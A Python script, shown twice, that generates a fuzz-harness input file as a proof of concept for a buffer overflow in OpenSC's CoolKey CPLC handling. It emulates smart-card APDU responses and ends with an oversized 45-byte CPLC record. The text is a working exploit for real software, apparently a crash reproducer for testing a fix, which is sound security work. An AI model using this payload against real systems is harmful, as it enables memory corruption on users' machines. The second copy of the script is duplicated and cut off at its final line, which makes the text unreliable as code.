# Generator for fuzz_pkcs15_reader input (OpenSC CoolKey CPLC overflow PoC)
# Input format: sequence of records, each = <uint16 LE length><payload>
# Record 0 = ATR (discarded). Records 1+ = APDU responses in order;

import sys
import struct

def rec(payload):
    return struct.pack('<H', len(payload)) + payload

def build(path):
    records = []
    # #0 ATR (discarded)
    records.append(rec(bytes.fromhex('3bdd18008131fe4580f9a0000000770100700a')))
    # #1 select CoolKey AID (00 a4 04 00 lc=7) -> 9000
    records.append(rec(bytes.fromhex('9000')))
    # #2 b0 3c 01 00 (match read) -> 6d 00 => coolkey match returns 1
    records.append(rec(bytes.fromhex('6d00')))
    # #3 b0 f2 00 00 -> 9000
    records.append(rec(bytes.fromhex('9000')))
    # #4 b0 f2 00 00 -> 9000
    records.append(rec(bytes.fromhex('9000')))
    # #5 b0 3c 00 00 -> 9000
    records.append(rec(bytes.fromhex('9000')))
    # #6 00 a4 04 00 lc=7 (select) -> 9000
    records.append(rec(bytes.fromhex('9000')))
    # #7 b0 58 00 00 (list objects) -> one valid 14-byte object + 9000
    records.append(rec(bytes(range(1, 15)) + bytes.fromhex('9000')))
    # #8 b0 58 01 00 (next object) -> 9c 12 (terminates object loop)
    records.append(rec(bytes.fromhex('9c12')))
    # #9 00 a4 04 0c lc=7 -> 9000
    records.append(rec(bytes.fromhex('9000')))
    # #10 80 ca 9f 7f (GET CPLC) -> 45-byte CPLC data + 9000
    # CPLC is 0x2d=45 bytes (vul accepts; fix rejects > 0x2c=44)
    cplc = bytes.fromhex('9f7f2a') + bytes(range(0x21, 0x21 + 42))
    assert len(cplc) == 45
    records.append(rec(cplc + bytes.fromhex('9000')))
    # #11 00 a4 04 00 -> 9000
    records.append(rec(bytes.fromhex('9000')))
    # #12 00 a4 04 00 -> 9000
    records.append(rec(bytes.fromhex('9000')))
    # #13+ b0 56 00 00 lc=17 reads -> respond with data + 9000, then 9c12
    for i in range(8):
        records.append(rec(bytes([0] * 16) + bytes.fromhex('9000')))
    records.append(rec(bytes.fromhex('9c12')))
    data = b''.join(records)
    with open(path, 'wb') as f:
        f.write(data)
    print('wrote %d bytes to %s' % (len(data), path))

if __name__ == '__main__':
    build(sys.argv[1] if len(sys.argv) > 1 else '/tmp/poc.bin')

# Generator for fuzz_pkcs15_reader input (OpenSC CoolKey CPLC overflow PoC)
# Input format: sequence of records, each = <uint16 LE length><payload>
# Record 0 = ATR (discarded). Records 1+ = APDU responses in order;
# last 2 bytes of each record are SW1 SW2.
import sys
import struct

def rec(payload):
    return struct.pack('<H', len(payload)) + payload

def build(path):
    records = []
    # #0 ATR (discarded)
    records.append(rec(bytes.fromhex('3bdd18008131fe4580f9a0000000770100700a')))
    # #1 select CoolKey AID (00 a4 04 00 lc=7) -> 9000
    records.append(rec(bytes.fromhex('9000')))
    # #2 b0 3c 01 00 (match read) -> 6d 00 => coolkey match returns 1
    records.append(rec(bytes.fromhex('6d00')))
    # #3 b0 f2 00 00 -> 9000
    records.append(rec(bytes.fromhex('9000')))
    # #4 b0 f2 00 00 -> 9000
    records.append(rec(bytes.fromhex('9000')))
    # #5 b0 3c 00 00 -> 9000
    records.append(rec(bytes.fromhex('9000')))
    # #6 00 a4 04 00 lc=7 (select) -> 9000
    records.append(rec(bytes.fromhex('9000')))
    # #7 b0 58 00 00 (list objects) -> one valid 14-byte object + 9000
    records.append(rec(bytes(range(1, 15)) + bytes.fromhex('9000')))
    # #8 b0 58 01 00 (next object) -> 9c 12 (terminates object loop)
    records.append(rec(bytes.fromhex('9c12')))
    # #9 00 a4 04 0c lc=7 -> 9000
    records.append(rec(bytes.fromhex('9000')))
    # #10 80 ca 9f 7f (GET CPLC) -> 45-byte CPLC data + 9000
    # CPLC is 0x2d=45 bytes (vul accepts; fix rejects > 0x2c=44)
    cplc = bytes.fromhex('9f7f2a') + bytes(range(0x21, 0x21 + 42))
    assert len(cplc) == 45
    records.append(rec(cplc + bytes.fromhex('9000')))
    # #11 00 a4 04 00 -> 9000
    records.append(rec(bytes.fromhex('9000')))
    # #12 00 a4 04 00 -> 9000
    records.append(rec(bytes.fromhex('9000')))
    # #13+ b0 56 00 00 lc=17 reads -> respond with data + 9000, then 9c12
    for i in range(8):
        records.append(rec(bytes([0] * 16) + bytes.fromhex('9000')))
    records.append(rec(bytes.fromhex('9c12')))
    data = b''.join(records)
    with open(path, 'wb') as f:
        f.write(data)
    print('wrote %d bytes to %s' % (len(data), path))

if __name__ == '__main__':
